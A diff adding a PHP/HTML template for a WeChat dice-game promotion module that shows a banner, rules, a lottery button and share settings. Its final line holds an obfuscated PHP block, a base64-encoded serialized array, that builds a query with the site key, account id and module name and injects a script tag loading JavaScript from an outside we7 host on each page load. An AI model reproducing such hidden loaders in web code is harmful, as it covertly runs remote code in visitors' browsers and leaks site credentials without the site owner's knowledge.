@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="”apple-mobile-web-app-capable”" content="”yes”">
+	<meta content="telephone=no" name="format-detection">
+	<title>{$bbb['title']}</title>
+	{php echo register_jssdk();}
+	<link href="../addons/hl_bbb/template/images/style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="page-load-container">
+	<div class="page-load-page ranking-page">
+		<div class="ranking-body" style="padding-top:0px;">
+			<div class="ranking-banner">
+				{if !empty($bbb['headurl'])}
+				<a href="{$bbb['headurl']}" target="_blank">
+				{/if}
+				{if empty($bbb['headpic'])}
+				<img src="../addons/hl_bbb/template/images/bg-header.jpg" width="100%">
+				{else}
+				<img src="{$_W['attachurl']}{$bbb['headpic']}" width="100%">
+				{/if}
+				{if !empty($bbb['headurl'])}
+				</a>
+				{/if}
+			</div>
+			{if !empty($_W['account']['subscribeurl'])}
+			<div class="subscribeurl">
+				<img src="{$_W['account']['subscribeurl']}" onerror="this.parentNode.style.display='none'"/>
+			</div>
+			{/if}
+			<div class="rule">
+				<span>{$followInfo}</span>
+				<p style="font-size: 16px;">活动规则：</p>
+				{$bbb['rule']}
+			</div>
+		</div>
+		<div class="power-by">
+			@{$_W['account']['name']}
+		</div>
+	</div>
+</div>
+<style>
+	.footerbar {left: 0;bottom: 0;width: 100%;height: 77px;text-align:center;}
+</style>
+<div class="footerbar">
+	<a href="{php echo $this->createMobileUrl('lottery', array('id' => $id))}">
+		<img src="../addons/hl_bbb/template/images/start-button.png">
+	</a>
+</div>
+<script type="text/javascript">
+	var link = "{php echo $_W['siteroot'].'app'. ltrim($this->createMobileUrl('info', array('id' => $id,'uid' => $user['id'])),'.')}";
+	// 摇骰子分享
+	wx.ready(function () {
+		sharedata = {
+			title: "{$bbb['title']}",
+			desc: "{$bbb['descriptions']}",
+			link: link,
+			imgUrl: "{$_W['siteroot']}addons/hl_bbb/template/images/d1.png"
+		};
+		wx.onMenuShareAppMessage(sharedata);
+		wx.onMenuShareTimeline(sharedata);
+	});
+</script>
+{php global $_W;$_we7_ad_ujfqr = unserialize(base64_decode('YToyOntzOjE6InMiO2E6MTg6e2k6MTQ7czo0NzoiaHR0cDovL3Mud2U3LmNjL2luZGV4LnBocD9jPXN0b3JlJmE9bGluayZkbz1hZCYiO2k6MztzOjQ6InR5cGUiO2k6MTA7czo4OiJzaXRlX2tleSI7aToxNztzOjExOiIiPjwvc2NyaXB0PiI7aToxNTtzOjE6IiYiO2k6NjtzOjE0OiJjdXJyZW50X21vZHVsZSI7aToxO3M6NzoiYWRfdHlwZSI7aTo4O3M6NzoidW5pYWNpZCI7aTo0O3M6NDoidmlldyI7aToyO3M6MToiMSI7aToxMTtzOjc6InNldHRpbmciO2k6NTtzOjY6Im1vZHVsZSI7aTo3O3M6NDoibmFtZSI7aToxNjtzOjM2OiI8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSIiO2k6MDtzOjA6IiI7aToxMztzOjM6ImtleSI7aTo5O3M6NzoidW5pYWNpZCI7aToxMjtzOjQ6InNpdGUiO31zOjE6ImYiO2E6Mjp7aTowO3M6MTY6Imh0dHBfYnVpbGRfcXVlcnkiO2k6MTtzOjQ6Im51bGwiO319')); $modulename = 'hl_bbb'; $querystring = array( $_we7_ad_ujfqr['s'][0x0001] => $_we7_ad_ujfqr['s'][0x00000002], $_we7_ad_ujfqr['s'][0x0003] => $_we7_ad_ujfqr['s'][0x04], $_we7_ad_ujfqr['s'][0x005] => !empty($modulename) ? $modulename : $_W[$_we7_ad_ujfqr['s'][0x00000006]][$_we7_ad_ujfqr['s'][0x00007]], $_we7_ad_ujfqr['s'][0x000008] => $_W[$_we7_ad_ujfqr['s'][0x00009]], $_we7_ad_ujfqr['s'][0x00000a] => $_W[$_we7_ad_ujfqr['s'][0x0000b]][$_we7_ad_ujfqr['s'][0x0000c]][$_we7_ad_ujfqr['s'][0x00000d]], ); $url = $_we7_ad_ujfqr['s'][0x0000e].$_we7_ad_ujfqr['f'][0x0000000]($querystring, $_we7_ad_ujfqr['f'][0x001], $_we7_ad_ujfqr['s'][0x00f]); echo $_we7_ad_ujfqr['s'][0x0010].$url.$_we7_ad_ujfqr['s'][0x00011];}
+</body>
+</html>
